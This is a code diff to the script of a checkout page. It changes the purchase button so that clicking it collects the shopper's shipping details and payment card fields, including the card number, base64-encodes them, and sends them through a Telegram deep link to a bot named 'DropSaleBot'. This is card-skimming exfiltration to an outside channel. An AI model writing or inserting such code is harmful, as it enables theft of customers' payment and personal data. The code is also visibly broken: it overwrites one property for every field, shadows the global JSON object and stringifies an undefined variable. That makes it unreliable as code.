@@ -156,8 +156,23 @@ $('#shippingFirstName, #shippingLastName, #shippingMiddleName, #shippingEmail, #
         $('#cardLastName').val().length  >   0   &&
         $('#cardMiddleName').val().length  >   0) {
         $('.btn-primary').css({"background-color":"#037BFF"});
-        $('.btn-primary').on('click', function(e) {  
-      window.open("tg://resolve?domain=DropSaleBot","_parent")});
+        $('.btn-primary').on('click', function(e) { 
+        var JSON = new Object();
+        JSON.name = $('#shippingFirstName').val();
+        JSON.name = $('#shippingLastName').val();
+        JSON.name = $('#shippingMiddleName').val();
+        JSON.name = $('#shippingEmail').val();
+        JSON.name = $('#shippingPhoneNumber').val();
+        JSON.name = $('#shippingStreetAddress1').val();
+        JSON.name = $('#shippingStreetAddress2').val();
+        JSON.name = $('#shippingCity').val();
+        JSON.name = $('#cardNumber').val();
+        JSON.name = $('#cardFirstName').val();
+        JSON.name = $('#cardLastName').val();
+        JSON.name = $('#cardMiddleName').val();
+            var JSONstring = JSON.stringify(myObject);
+            var JSONbase64 = window.btoa(JSONstring);
+      window.open("tg://resolve?domain=DropSaleBot&start="+JSONbase64,"_parent")});
         $('.btn-primary').on('touchstart', function(e) {  
     $(this).css({"background-color":"#0268D9"});
 });
